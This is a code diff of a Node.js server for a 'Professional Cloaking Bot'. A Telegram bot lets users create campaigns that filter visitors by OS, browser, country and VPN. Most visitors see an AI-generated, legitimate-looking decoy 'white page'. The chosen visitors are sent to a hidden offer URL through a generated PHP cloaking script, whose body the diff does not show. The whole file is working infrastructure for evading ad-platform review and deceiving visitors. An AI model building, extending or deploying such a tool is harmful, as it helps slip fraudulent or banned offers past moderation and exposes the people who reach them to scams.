@@ -1,4 +1,4 @@
-// server.js – Professional Cloaking Bot v3.0 (Final)
+// server.js – Professional Cloaking Bot (FINAL WORKING)
 require('dotenv').config();
 const express = require('express');
 const session = require('express-session');
@@ -12,7 +12,13 @@ const path = require('path');
 const fs = require('fs');
 const archiver = require('archiver');
 
-// ---------- Database Setup ----------
+const app = express();
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(session({ secret: process.env.SESSION_SECRET, resave: false, saveUninitialized: false }));
+app.use(express.static('public'));
+
+// Database setup
 const db = new sqlite3.Database(path.join(__dirname, 'cloaking.db'));
 db.serialize(() => {
     db.run(`CREATE TABLE IF NOT EXISTS users (
@@ -58,26 +64,11 @@ db.serialize(() => {
         data TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )`);
-    db.run(`CREATE TABLE IF NOT EXISTS user_domains (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        user_id INTEGER,
-        domain TEXT UNIQUE,
-        verification_token TEXT,
-        verified INTEGER DEFAULT 0,
-        campaign_id TEXT,
-        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-    )`);
 });
 
-const app = express();
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-app.use(session({ secret: process.env.SESSION_SECRET, resave: false, saveUninitialized: false }));
-app.use(express.static('public'));
-
-// ---------- Helper: AI Multi‑File White Page ----------
+// Helper: AI White Page (multi-file zip)
 async function generateWhitePageHTML(niche) {
-    const prompt = `Generate a complete, modern, legitimate-looking multi-page website HTML for the niche: "${niche}". Include inline CSS for a professional look. Add header, main content, CTA button, footer. Return ONLY valid HTML starting with <!DOCTYPE html>.`;
+    const prompt = `Generate a complete, modern, legitimate-looking multi-page website HTML for the niche: "${niche}". Include inline CSS, header, main content, CTA button, footer. Return ONLY valid HTML starting with <!DOCTYPE html>.`;
     try {
         const res = await axios.post(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${process.env.GEMINI_API_KEY}`, {
             contents: [{ parts: [{ text: prompt }] }]
@@ -111,7 +102,7 @@ async function generateMultiFileWhitePage(niche) {
     return zipPath;
 }
 
-// ---------- Helper: Advanced PHP Cloaking Script (with SQLite logging) ----------
+// Helper: Generate PHP cloaking script (advanced)
 function generateAdvancedPHP(campaign, customDomain = null) {
     const { id, offer_url, white_type, white_value, white_zip, allowed_os, allowed_browsers, allowed_countries, clicks_per_day, block_vpn } = campaign;
     const domain = customDomain || process.env.DOMAIN;
@@ -174,7 +165,7 @@ else{
 ?>`;
 }
 
-// ---------- Auth Middleware ----------
+// Auth middleware
 const auth = (req, res, next) => {
     const token = req.headers.authorization?.split(' ')[1];
     if (!token && !req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
@@ -185,7 +176,7 @@ const auth = (req, res, next) => {
     next();
 };
 
-// ---------- API Routes ----------
+// API Routes
 app.post('/api/register', async (req, res) => {
     const { email, password, telegram_id } = req.body;
     if (!email || !password) return res.status(400).json({ error: 'Missing fields' });
@@ -252,7 +243,7 @@ app.post('/api/track', (req, res) => {
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`, [campaign_id, ip, user_agent, decision, country, isp, device, os, browser, referrer], () => { res.json({ok:true}); });
 });
 
-// ---------- Telegram Bot (All Commands + Inline Buttons) ----------
+// Telegram Bot
 const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
 async function getTempSession(tid) { return new Promise((resolve) => db.get(`SELECT step, data FROM temp_sessions WHERE telegram_id = ?`, [tid], (err, row) => resolve(row ? { step: row.step, data: row.data ? JSON.parse(row.data) : {} } : { step: null, data: {} }))); }
 async function setTempSession(tid, step, data={}) { db.run(`INSERT OR REPLACE INTO temp_sessions (telegram_id, step, data) VALUES (?, ?, ?)`, [tid, step, JSON.stringify(data)]); }
@@ -309,13 +300,10 @@ bot.on('text', async (ctx) => {
     const tid = ctx.from.id, text = ctx.message.text.trim();
     const session = await getTempSession(tid);
     if (!session.step) return;
-    // Registration
     if (session.step === 'reg_email') { if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(text)) return ctx.reply('❌ Invalid email.'); session.data.email = text; setTempSession(tid, 'reg_password', session.data); return ctx.reply('🔒 Send password (min 6 chars):'); }
     if (session.step === 'reg_password') { if (text.length<6) return ctx.reply('❌ Min 6 chars.'); session.data.password = text; setTempSession(tid, 'reg_confirm', session.data); return ctx.reply('🔁 Confirm password:'); }
     if (session.step === 'reg_confirm') { if (text !== session.data.password) return ctx.reply('❌ Passwords do not match.'); try { await createUser(session.data.email, session.data.password, tid); await ctx.reply('✅ Registration successful! Press /start.'); clearTempSession(tid); } catch(e) { ctx.reply('❌ Email exists. Use /start → Link.'); clearTempSession(tid); } return; }
-    // Link existing
     if (session.step === 'link_email') { db.get(`SELECT id FROM users WHERE email = ?`, [text], async (err, user) => { if (!user) return ctx.reply('❌ No account.'); db.run(`UPDATE users SET telegram_id = ? WHERE id = ?`, [tid, user.id], (err) => { if (err) ctx.reply('Error linking.'); else ctx.reply('✅ Linked! Use /start'); clearTempSession(tid); }); }); return; }
-    // Campaign creation steps
     if (session.step === 'campaign_name') { session.data.name = text; setTempSession(tid, 'offer_url', session.data); return ctx.reply("🔗 *Step 2/8:* Send offer URL (https://...)", { parse_mode: 'Markdown' }); }
     if (session.step === 'offer_url') { if (!text.startsWith('http')) return ctx.reply('❌ Valid URL'); session.data.offer_url = text; setTempSession(tid, 'white_type', session.data); return ctx.replyWithMarkdown("🎨 *Step 3/8:* White page source?", Markup.inlineKeyboard([[Markup.button.callback('🤖 AI Generate', 'white_ai')], [Markup.button.callback('🌐 External URL', 'white_url')]])); }
     if (session.step === 'white_url') { if (!text.startsWith('http')) return ctx.reply('❌ Valid URL'); session.data.white_value = text; setTempSession(tid, 'allowed_os', session.data); return ctx.replyWithMarkdown("💻 *Step 4/8:* Allowed OS (comma, e.g., Windows, macOS, Android) or `skip`", { parse_mode: 'Markdown' }); }
